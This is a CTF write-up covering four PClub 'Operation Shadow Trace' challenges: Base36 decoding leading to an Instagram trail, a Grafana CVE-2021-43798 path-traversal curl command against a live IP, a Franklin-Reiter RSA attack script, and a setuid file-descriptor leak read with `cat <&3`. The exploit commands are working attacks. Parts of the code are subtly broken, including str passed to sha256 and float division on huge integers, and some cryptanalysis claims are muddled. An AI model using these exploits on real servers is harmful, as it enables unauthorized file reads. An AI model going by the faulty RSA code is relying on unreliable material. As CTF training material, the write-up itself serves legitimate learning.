# Operation Shadow Trace - Complete Writeup

A comprehensive writeup of the Operation Shadow Trace CTF challenges, including both successful solutions and unsuccessful attempts that led to the final solutions.

## Table of Contents
1. [Challenge 1: Base Decoding & Instagram Investigation](#challenge-1-base-decoding--instagram-investigation)
2. [Challenge 2: Grafana Path Traversal](#challenge-2-grafana-path-traversal)
3. [Challenge 3: SHA-256 Proof of Work & Franklin-Reiter Attack](#challenge-3-sha-256-proof-of-work--franklin-reiter-attack)
4. [Challenge 4: File Descriptor Privilege Escalation](#challenge-4-file-descriptor-privilege-escalation)

---

## Challenge 1: Base Decoding & Instagram Investigation

### Initial Approach
After receiving hints, I investigated the Kalpit Lal Rama Blog. Following the trail from LinkedIn to Reddit, I discovered a series of numbers that appeared to be encoded.

### The Numbers
```
12668958
29326
23627944634268
3108
8
523948
01050036027972
87177902339084610664
```

### Unsuccessful Attempts
- **Base64 Decoding**: Initially tried standard Base64 decoding, but the numbers didn't produce meaningful ASCII text
- **Hexadecimal**: Attempted to interpret as hex values, but results were gibberish
- **Binary**: Tried converting to binary first, then interpreting as text - no success
- **Base32**: Similar approach to Base64, but yielded no readable output
- **Caesar Cipher**: Thought it might be a simple substitution cipher after base conversion - incorrect assumption

### Successful Solution
Based on the hint about "common bases," I tried **Base36 in ABC...012... mode**:

**Decoded Message**: `HTTPS WWW INSTAGRAM COM I LIKE ANONYMITY SOMETIMES1212`

This led to the Instagram URL: `https://www.instagram.com/i_like_anonymity_sometimes1212/`

### Instagram Investigation
Following the Instagram story, I found an image with the text "I hope I didn't leak any vital information" and a Wikipedia link.

### Wikipedia Edit History Analysis
- Discovered the page was last edited on May 17 (the release date of PClub tasks)
- Compared edit history to find the hidden flag and next challenge link

**Flag 1**: `PClub{idk_how_this_got_typed}`

---

## Challenge 2: Grafana Path Traversal

### Initial Reconnaissance
- Accessed Grafana instance at `13.126.50.182:3000`
- Logged in with admin credentials
- Standard interface provided no obvious vulnerabilities

### Unsuccessful Attempts
- **SQL Injection**: Tried various SQL injection payloads in dashboard queries - no success
- **XSS**: Attempted stored XSS in dashboard names and descriptions - filtered
- **Default Credentials**: Tried common Grafana default passwords beyond admin:admin - already changed
- **API Exploitation**: Attempted to abuse Grafana API endpoints - proper authentication required
- **Plugin Upload**: Tried uploading malicious plugins - insufficient permissions

### Successful Path Traversal Attack
Research revealed **CVE-2021-43798** - a path traversal vulnerability in Grafana.

**Vulnerability**: `https://github.com/jas502n/Grafana-CVE-2021-43798`

Given the hint about "temporary files," I used:

```bash
curl --path-as-is http://13.126.50.182:3000/public/plugins/alertlist/../../../../../../../../tmp/flag
```

**Flag 2**: `PClub{Easy LFI}`

---

## Challenge 3: SHA-256 Proof of Work & Franklin-Reiter Attack

### Initial Connection
Connected to `3.109.250.1:5000` using netcat, which presented a proof-of-work challenge:

```
Find a string such that SHA-256 hash of "zMrwcu" concatenated with your input starts with the string "15157".
```

### Proof of Work Solution
Created a Python brute-force script:

```python
import hashlib
import itertools
import string

def find_hash_string(prefix, target_start):
    chars = string.ascii_letters + string.digits
    for length in range(1, 10):
        for attempt in itertools.product(chars, repeat=length):
            test_string = ''.join(attempt)
            hash_input = prefix + test_string
            hash_result = hashlib.sha256(hash_input.encode()).hexdigest()
            if hash_result.startswith(target_start):
                return test_string
    return None

result = find_hash_string("zMrwcu", "15157")
print(f"Found string: {result}")
```

### Server Options Analysis
After solving the proof-of-work, the server presented three options:
1. View first half of code
2. View second half of code  
3. Get flag (RSA challenge)

### Code Analysis
**Part 1** revealed the menu system:
```python
while True:
    print(help_menu)
    c = input().strip()
    if c == "1":
        return 1
    elif c == "2":
        return 2
    elif c == "3":
        return 3
    else:
        print("Please select a valid option!")
```

**Part 2** showed the RSA oracle:
```python
def main():
    if not proof():
        print("Check Failed!")
        return
    return_val = options()
    # ... menu handling ...
    elif return_val==3:
        byts = bytes_to_long(m)
        sys.stdout.write("Give me a padding: ")
        padding = input().strip()
        padding = int(sha256(padding.encode()).hexdigest(), 16)
        c = pow(byts + padding, e, n)
        print("Ciphertext : ", c)
```

### Unsuccessful RSA Attempts
- **Direct Factorization**: Attempted to factor n directly - computationally infeasible
- **Wiener's Attack**: Tried assuming small private exponent - didn't work with e=3
- **Common Modulus Attack**: Initially thought multiple encryptions used same n but different e - incorrect assumption
- **Fermat's Factorization**: Attempted when suspecting n might be product of close primes - unsuccessful

### Successful Franklin-Reiter Attack
Realized this was a **Franklin-Reiter Attack** scenario since we could get ciphertexts of related plaintexts.

**Setup**: 
- Assuming e = 3 (common in CTF challenges)
- Two related messages: m + hash('1') and m + hash('2')

```python
import hashlib
import gmpy2
from Crypto.Util.number import *

# Get two ciphertexts with different paddings
h1 = int(hashlib.sha256('2').hexdigest(), 16)
h2 = int(hashlib.sha256('1').hexdigest(), 16)
diff = h1 - h2

n = 21727106551797231400330796721401157037131178503238742210927927256416073956351568958100038047053002307191569558524956627892618119799679572039939819410371609015002302388267502253326720505214690802942662248282638776986759094777991439524946955458393011802700815763494042802326575866088840712980094975335414387283865492939790773300256234946983831571957038601270911425008907130353723909371646714722730577923843205527739734035515152341673364211058969041089741946974118237091455770042750971424415176552479618605177552145594339271192853653120859740022742221562438237923294609436512995857399568803043924319953346241964071252941
e = 3

c2 = 13437526472436443794216183194447347160957723113505232847990603147292226928038102057351088581769825769065742799938562195899137207985168638686932973500805175120244776171552623797311717352445842354506839648768961557995566066583379882671063443061221126889161415626667882853789182863427348340550703864877348720316075406615895429590542123490206825841826084125675586562000477548391938871164802515094842964422894509501874136226610585205845061872299086431519078988424124896067831101905411828982263797227188944518022431818652500299284644830387239226510273289074636855097814995843282536891849770922688308317857032217413503938121
c1 = 13437526472436443794216183194447347160957723113505232847991197044990694452064187638828229250639551255210316763627721100364952531534410262274944422259435782727763358752227406490092795775074286982312189166588418626166051425763659104611533200781764628814830491620927191511939357688185404755633404206702773120838149187777597581080271639970862466076576509151108609217917755193696604489093301419660992126973461884190135876181959228647321165835055056071342463501310454319921715938715852965567400098245092949393052106130061931330924706220158687374897426386916510522364086747482531381128881740542369109849527510266076215148177

# Franklin-Reiter attack implementation
b = 3*(h1 + h2)
x = (c1-c2)/(h1-h2)
c = (h1**2 + h1*h2 + h2**2) - x

det = gmpy2.iroot(b**2 - 12*c, 2)
sol1 = (det[0] - b)//6

result = long_to_bytes(sol1)
print(result)
```

**Flag 3**: `PClub{Franklin_Reiter_is_cool}`

---

## Challenge 4: File Descriptor Privilege Escalation

### Initial Access
Connected via netcat to receive a non-interactive shell:
```
sh: 0: can't access tty; job control turned out
```

Basic commands like `ls` and `whoami` still functioned.

### File Analysis
Found two files:
- `file_chal` (executable)
- `file_chal.c` (source code)

**Source Code**:
```c
#include <fcntl.h>
#include <unistd.h>

int main () {
    int fd = open ("/root/flag", 0);

    // Dropping root privileges
    // definitely not forgetting anything
    setuid (getuid ());

    char* args[] = { "sh", 0 };
    execvp ("/bin/sh", args);
    return 0;
}
```

### Unsuccessful Attempts
- **Direct File Access**: Tried `cat /root/flag` - permission denied after privilege drop
- **SUID Bit Abuse**: Attempted to maintain root privileges - setuid() properly dropped them
- **Race Condition**: Tried to access flag between open() and setuid() - timing too tight
- **Environment Variables**: Attempted to manipulate environment to maintain privileges - ineffective

### Successful File Descriptor Attack
**Key Insight**: File descriptors opened as root remain accessible even after dropping privileges!

**Steps**:
1. Checked file permissions: `ls -la file_chal`
   ```
   -rwsr-xr-x 1 root ctf 8760 May 17 10:30 file_chal
   ```
   (SUID bit set - runs with root privileges initially)

2. Executed the binary: `./file_chal`
   
3. Listed open file descriptors: `ls -l /proc/$$/fd`
   ```
   total 0
   lrwx------ 1 ctf ctf 64 May 25 01:10 0 -> /dev/pts/33
   lrwx------ 1 ctf ctf 64 May 25 01:10 1 -> /dev/pts/33
   lrwx------ 1 ctf ctf 64 May 25 01:10 2 -> /dev/pts/33
   lr-x------ 1 ctf ctf 64 May 25 01:10 3 -> /root/flag
   lr-x------ 1 ctf ctf 64 May 25 01:10 4 -> /root/flag
   ```

4. Read from the open file descriptor: `cat <&3`

**Flag 4**: `PClub{4lw4ys_cl05e_y0ur_fil3s}`

---

## Key Learnings

### Security Lessons
1. **Always close file descriptors** when dropping privileges
2. **Path traversal vulnerabilities** remain common in web applications
3. **Franklin-Reiter attacks** are effective against RSA with small exponents and related plaintexts
4. **Social engineering aspects** of CTFs often involve following digital breadcrumbs across platforms

### Technical Skills Developed
- Base conversion and encoding recognition
- RSA cryptanalysis techniques
- Web application vulnerability assessment
- Unix file descriptor manipulation
- Python scripting for cryptographic attacks

### Tools Used
- **netcat** for network connections
- **curl** for HTTP requests with custom headers
- **Python** for brute force and cryptographic attacks
- **SageMath** for advanced mathematical computations
- **Standard Unix tools** (ls, cat, etc.) for system reconnaissance

---

## Conclusion

This CTF challenge series demonstrated the importance of:
- Persistent reconnaissance and following all available leads
- Understanding both successful attack vectors and why other approaches fail
- Combining multiple skill sets (web security, cryptography, system administration)
- Documenting both successful and unsuccessful attempts for learning purposes

The challenges progressed logically from information gathering through cryptographic attacks to system exploitation, providing a comprehensive security assessment experience.